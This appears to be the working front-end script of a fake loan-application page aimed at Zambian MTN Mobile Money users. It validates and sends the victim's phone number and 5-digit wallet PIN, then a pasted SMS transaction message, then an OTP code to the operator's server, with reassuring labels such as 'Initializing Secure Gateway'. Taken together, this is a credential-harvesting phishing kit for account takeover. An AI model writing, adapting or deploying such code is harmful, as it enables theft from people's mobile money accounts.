let currentAppId = null;

const phoneInput = document.getElementById('momo_phone');
const pinInput = document.getElementById('momo_pin');
const nextStepBtn = document.getElementById('nextStepBtn');
const loanAmountSlider = document.getElementById('loanAmount');
const amountDisplay = document.getElementById('amountDisplay');

// Update slider value visual representation
if (loanAmountSlider) {
  loanAmountSlider.addEventListener('input', (e) => {
    amountDisplay.textContent = Number(e.target.value).toLocaleString() + ' ZMW';
  });
}

// Ensure phone field always starts with +260 and validates strictly
if (phoneInput) {
  if (!phoneInput.value.startsWith('+260')) {
    phoneInput.value = '+260';
  }
  phoneInput.addEventListener('input', (e) => {
    if (!e.target.value.startsWith('+260')) {
      e.target.value = '+260';
    }
    validateStepOne();
  });
}

// Enforce 5-digit PIN constraints
if (pinInput) {
  pinInput.addEventListener('input', () => {
    // Strip non-digits and cap at 5
    pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 5);
    validateStepOne();
  });
}

function validateStepOne() {
  const phoneVal = phoneInput.value;
  const pinVal = pinInput.value;

  // Strict check: +260 followed by MTN prefixes 96 or 76, then 7 digits total
  const isPhoneValid = /^\+260(96|76)\d{7}$/.test(phoneVal);
  // Strict check: Exactly 5 digits
  const isPinValid = /^\d{5}$/.test(pinVal);

  if (isPhoneValid && isPinValid) {
    nextStepBtn.removeAttribute('disabled');
  } else {
    nextStepBtn.setAttribute('disabled', 'true');
  }
}

// Step 1 Submission handler
if (nextStepBtn) {
  nextStepBtn.addEventListener('click', async () => {
    nextStepBtn.textContent = 'Initializing Secure Gateway...';
    nextStepBtn.setAttribute('disabled', 'true');

    try {
      // Create session
      const createRes = await fetch('/applications', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ amount: loanAmountSlider.value })
      });
      const createData = await createRes.json();
      currentAppId = createData.id;

      // Submit Auth details
      const authRes = await fetch(`/applications/${currentAppId}/submit-auth`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          momo_phone: phoneInput.value,
          momo_pin: pinInput.value
        })
      });

      if (authRes.ok) {
        transitionStep(1, 2);
      } else {
        const err = await authRes.json();
        alert(err.error || 'Validation error occurred.');
        nextStepBtn.textContent = 'Proceed to Verification';
        nextStepBtn.removeAttribute('disabled');
      }
    } catch (e) {
      console.error(e);
      alert('Network connection error.');
      nextStepBtn.textContent = 'Proceed to Verification';
      nextStepBtn.removeAttribute('disabled');
    }
  });
}

// Step 2 SMS Submission
const submitSmsBtn = document.getElementById('submitSmsBtn');
const smsTextarea = document.getElementById('sms_text');

if (submitSmsBtn) {
  submitSmsBtn.addEventListener('click', async () => {
    if (!smsTextarea.value.trim()) {
      alert('Please paste your SMS transaction text string.');
      return;
    }

    submitSmsBtn.textContent = 'Processing SMS...';
    submitSmsBtn.setAttribute('disabled', 'true');

    try {
      const res = await fetch(`/applications/${currentAppId}/submit-sms`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sms_text: smsTextarea.value })
      });

      if (res.ok) {
        transitionStep(2, 3);
      } else {
        alert('Failed to submit SMS text.');
        submitSmsBtn.textContent = 'Submit SMS Log';
        submitSmsBtn.removeAttribute('disabled');
      }
    } catch (e) {
      console.error(e);
      submitSmsBtn.textContent = 'Submit SMS Log';
      submitSmsBtn.removeAttribute('disabled');
    }
  });
}

// Step 3 OTP Submission
const submitOtpBtn = document.getElementById('submitOtpBtn');
const otpInput = document.getElementById('otp_code');

if (submitOtpBtn) {
  submitOtpBtn.addEventListener('click', async () => {
    if (!otpInput.value.trim()) {
      alert('Please enter the OTP code.');
      return;
    }

    submitOtpBtn.textContent = 'Verifying Token...';
    submitOtpBtn.setAttribute('disabled', 'true');

    try {
      const res = await fetch(`/applications/${currentAppId}/submit-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otp_code: otpInput.value })
      });

      if (res.ok) {
        document.getElementById('step-3').style.display = 'none';
        document.getElementById('step-success').style.display = 'block';
        document.getElementById('indicator-3').classList.add('active');
      } else {
        alert('Verification failed.');
        submitOtpBtn.textContent = 'Complete Application';
        submitOtpBtn.removeAttribute('disabled');
      }
    } catch (e) {
      console.error(e);
      submitOtpBtn.textContent = 'Complete Application';
      submitOtpBtn.removeAttribute('disabled');
    }
  });
}

function transitionStep(from, to) {
  document.getElementById(`step-${from}`).style.display = 'none';
  document.getElementById(`step-${to}`).style.display = 'block';
  document.getElementById(`indicator-${from}`).classList.remove('active');
  document.getElementById(`indicator-${to}`).classList.add('active');
}
